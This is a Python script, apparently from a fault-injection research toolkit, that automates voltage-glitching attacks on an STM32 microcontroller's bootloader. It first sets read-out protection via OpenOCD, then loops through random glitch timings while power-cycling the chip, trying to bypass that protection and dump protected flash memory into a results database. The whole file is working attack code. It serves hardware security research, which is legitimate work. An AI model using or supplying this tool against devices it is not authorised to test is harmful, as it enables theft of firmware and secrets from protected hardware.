#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# programming
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; halt; stm32f4x unlock 0; exit"
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; halt; program GPIO_IOToggle.elf verify reset exit;"
# > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; halt; stm32f4x lock 0; sleep 1000; reset run; shutdown"
# -> power cycle the target!

# SQL Queries:
# Show only successes and flash-resets:
# color = 'R' or response LIKE '_Warning.flash_reset'

import argparse
import logging
import random
import sys
import time
import subprocess

# import custom libraries
sys.path.insert(0, "../lib/")
from BootloaderCom import BootloaderCom, GlitchState
from GlitchState import OKType, ExpectedType
from FaultInjectionLib import Database, PicoGlitcher, Helper

def program_target():
    result = subprocess.run(['openocd', '-f', 'interface/stlink.cfg', '-c', 'transport select hla_swd', '-f', 'target/stm32f4x.cfg', '-c', 'init; halt; program read-out-protection-test-CW308_STM32L0.elf verify reset exit;'], text=True, capture_output=True)
    print(result.stdout)
    print(result.stderr)
    result = subprocess.run(['openocd', '-f', 'interface/stlink.cfg', '-c', 'transport select hla_swd', '-f', 'target/stm32f4x.cfg', '-c', 'init; halt; stm32f4x lock 0; sleep 1000; reset run; shutdown;'], text=True, capture_output=True)
    print(result.stdout)
    print(result.stderr)

class Main:
    def __init__(self, args):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # glitcher
        self.glitcher = PicoGlitcher()
        # if argument args.power is not provided, the internal power-cycling capabilities of the pico-glitcher will be used. In this case, ext_power_voltage is not used.
        self.glitcher.init(port=args.rpico, ext_power=args.power, ext_power_voltage=3.3)

        # we want to trigger on x11 with the configuration 8e1
        # since our statemachine understands only 8n1,
        # we can trigger on x22 with the configuration 9n1 instead
        # Update: Triggering on x11 in configuration 8n1 works good enough.
        self.glitcher.uart_trigger(0x11)

        # set up the database
        self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store)
        # if number of experiments get too large, remove the expected results
        #self.database.cleanup("G")

        self.start_time = int(time.time())
        self.successive_fails = 0
        self.fail_gate_open = False
        self.fail_gate_close = 0

        # memory read settings
        self.bootcom = BootloaderCom(port=self.args.target, dump_address=0x08000000, dump_len=0x2000)
        self.dump_filename = f"{Helper.timestamp()}_memory_dump.bin"

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_length = self.args.length[0]
        e_length = self.args.length[1]
        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]

        experiment_id = 0
        while True:
            # set up glitch parameters (in nano seconds) and arm glitcher
            length = random.randint(s_length, e_length)
            delay = random.randint(s_delay, e_delay)
            self.glitcher.arm(delay, length)

            # reset target
            self.glitcher.reset(0.01)
            self.glitcher.power_cycle_target()
            time.sleep(0.15)
            self.bootcom.flush()

            # setup bootloader communication
            response = self.bootcom.init_bootloader()
            # setup memory read; this function triggers the glitch
            if issubclass(type(response), OKType):
                response = self.bootcom.setup_memread()

            # block until glitch
            try:
                self.glitcher.block(timeout=1)
            except Exception as _:
                print("[-] Timeout received in block(). Continuing.")
                self.glitcher.power_cycle_target(power_cycle_time=1)
                time.sleep(0.2)
                response = GlitchState.Warning.timeout

            # dump memory
            mem = b''
            if issubclass(type(response), OKType):
                #response, mem = self.bootcom.dump_memory_to_file(self.dump_filename)
                #start = 0x08000000
                start = 0x08000000 - 0*0xFF
                size = 0xFF
                response, mem = self.bootcom.read_memory(start, size)
                # DEBUG (to easily find the glitch with a logic analyzer)
                #time.sleep(1)
                #if mem != b'\x1f' and mem != b'\x79' and mem != b'':
                #    time.sleep(4)

            # classify response
            color = self.glitcher.classify(response)

            # add to database
            response_str = str(response).encode("utf-8") + mem
            self.database.insert(experiment_id, delay, length, color, response_str)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{length}\t{delay}\t{color}\t{response_str}", color))

            # error handling
            # exit if too many successive fails (including a supposedly successful memory read)
            # open fail gate, if error occured and everything was ok previously
            if not issubclass(type(response), ExpectedType) and not self.fail_gate_open:
                self.fail_gate_open = True
                self.fail_gate_close = experiment_id + 30
                self.successive_fails = 0
            # if fail gate open and error occured, increase the fail count
            if not issubclass(type(response), ExpectedType) and self.fail_gate_open:
                self.successive_fails += 1
            # close fail gate after 30 more experiments and check result
            if  experiment_id >= self.fail_gate_close and self.fail_gate_open:
                self.fail_gate_open = False
                if self.successive_fails >= 10:
                    # delete the eroneous datapoints, but not the first
                    for eid in range(experiment_id - 29, experiment_id):
                        self.database.remove(eid)
                    # get parameters of first erroneous experiment and store in database with extra classification
                    _, delay, length, _, _ = self.database.get_parameters_of_experiment(experiment_id - 30)
                    response = GlitchState.Warning.flash_reset
                    color = self.glitcher.classify(response)
                    response_str = str(response).encode("utf-8")
                    self.database.insert(experiment_id, delay, length, color, response_str)
                    # stop the script
                    break

            # increase experiment id
            experiment_id += 1

            # Dump finished
            if response == GlitchState.Success.dump_finished:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--rpico", required=False, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--power", required=False, help="rk6006 port", default=None)
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    args = parser.parse_args()

    main = Main(args)

    try:
        main.run()
    except KeyboardInterrupt:
        print("\nExitting...")
        sys.exit(1)